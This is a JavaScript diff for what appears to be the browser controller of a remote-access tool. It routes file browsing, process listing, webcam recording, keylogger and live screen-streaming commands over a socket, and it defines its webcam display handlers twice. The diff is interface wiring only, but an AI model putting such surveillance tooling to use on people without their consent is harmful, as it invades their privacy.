@@ -48,14 +48,32 @@ window.filterApps = function() {
 };
 
 // --- FILE MANAGER ---
+// Import dynamically to avoid circular dependency
+let FileManagerFeature = null;
+import('../features/fileManager.js').then(module => {
+    FileManagerFeature = module.FileManagerFeature;
+}).catch(err => {
+    console.error('Failed to load FileManagerFeature:', err);
+});
+
 window.getDrives = function() {
-    document.getElementById("current-path").textContent = "My Computer";
-    SocketService.send("GET_DRIVES");
+    if (FileManagerFeature) {
+        FileManagerFeature.getDrives();
+    } else {
+        // Fallback - send command directly
+        console.log('FileManagerFeature not loaded yet, using fallback');
+        SocketService.send("GET_DRIVES");
+    }
 };
 
 window.openFolder = function(path) {
-    document.getElementById("current-path").textContent = path;
-    SocketService.send("GET_DIR", path);
+    if (FileManagerFeature) {
+        FileManagerFeature.openFolder(path);
+    } else {
+        // Fallback - send command directly
+        console.log('FileManagerFeature not loaded yet, using fallback');
+        SocketService.send("GET_DIR", path);
+    }
 };
 
 window.reqDownloadFile = function(path) {
@@ -86,10 +104,47 @@ window.getProcesses = function() {
 };
 
 // --- WEBCAM ---
+/**
+ * Toggle Webcam ON/OFF (New unified function)
+ */
+window.toggleWebcam = function() {
+    WebcamFeature.toggleWebcam();
+};
+
+/**
+ * Start recording webcam
+ */
 window.startRecordWebcam = function() {
-    const duration = document.getElementById("record-duration")?.value || 10;
-    SocketService.send("RECORD_WEBCAM", duration);
-    UIManager.showToast(`Recording for ${duration}s...`, "info");
+    WebcamFeature.startRecording();
+};
+
+/**
+ * Cancel recording webcam
+ */
+window.cancelRecordWebcam = function() {
+    WebcamFeature.cancelRecording();
+};
+
+// --- WEBCAM DISPLAY CONTROLS ---
+/**
+ * Webcam zoom controls
+ */
+window.webcamZoom = function(action) {
+    WebcamFeature.zoom(action);
+};
+
+/**
+ * Toggle fit mode
+ */
+window.webcamToggleFit = function() {
+    WebcamFeature.toggleFitMode();
+};
+
+/**
+ * Fullscreen toggle
+ */
+window.webcamFullscreen = function() {
+    WebcamFeature.toggleFullscreen();
 };
 
 // --- KEYLOGGER ---
@@ -114,6 +169,65 @@ window.downloadLog = function() {
 };
 
 // --- MONITOR ---
+// Import MonitorFeature để gọi toggleMonitor
+import { MonitorFeature } from '../features/monitor.js';
+import { WebcamFeature } from '../features/webcam.js';
+
+window.toggleMonitor = function() {
+    MonitorFeature.toggleMonitor();
+};
+
+window.stopMonitor = function() {
+    // Gửi lệnh STOP_STREAM tới server
+    SocketService.send('STOP_STREAM');
+    
+    // Reset giao diện về trạng thái ban đầu
+    const img = document.getElementById("live-screen");
+    const placeholder = document.getElementById("screen-placeholder");
+    const status = document.getElementById("monitorStatus");
+
+    if (img) {
+        img.style.display = "none";
+        img.src = "";  // Clear src để giải phóng bộ nhớ
+    }
+    
+    if (placeholder) {
+        placeholder.style.display = "flex";
+    }
+    
+    if (status) {
+        status.innerText = "Ready";
+    }
+    
+    UIManager.showToast("Stream stopped", "info");
+};
+
+// --- MONITOR DISPLAY CONTROLS ---
+window.monitorZoom = function(action) {
+    MonitorFeature.zoom(action);
+};
+
+window.monitorToggleFit = function() {
+    MonitorFeature.toggleFitMode();
+};
+
+window.monitorFullscreen = function() {
+    MonitorFeature.toggleFullscreen();
+};
+
+// --- WEBCAM DISPLAY CONTROLS ---
+window.webcamZoom = function(action) {
+    WebcamFeature.zoom(action);
+};
+
+window.webcamToggleFit = function() {
+    WebcamFeature.toggleFitMode();
+};
+
+window.webcamFullscreen = function() {
+    WebcamFeature.toggleFullscreen();
+};
+
 window.viewFullImage = function(imgElement) {
     const w = window.open("");
     w.document.write(`<img src="${imgElement.src}" style="width:100%">`);
